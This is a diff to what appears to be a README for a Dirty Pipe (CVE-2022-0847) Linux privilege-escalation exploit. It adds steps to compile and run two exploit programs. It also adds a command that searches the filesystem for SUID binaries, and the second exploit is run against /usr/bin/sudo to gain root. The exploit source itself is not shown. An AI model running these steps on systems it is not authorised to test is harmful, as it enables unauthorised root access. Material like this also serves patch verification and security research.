@@ -13,6 +13,30 @@
 `5.15.25` 
 `5.10.102`
 
+### Requirements 
+
+`gcc`
+
+### Exploit 1
+
+```
+
+gcc CVE-2022-0847-exploit.c -o exploit-1
+
+./exploit-1 
+```
+
+### Exploit 2
+
+```
+
+gcc CVE-2022-0847-exploit2.c -o exploit-2
+
+find / -perm -4000 2>/dev/null
+
+./exploit-2 /usr/bin/sudo
+
+```
 
 [Source](https://en.wikipedia.org/wiki/Privilege_escalation)  
 
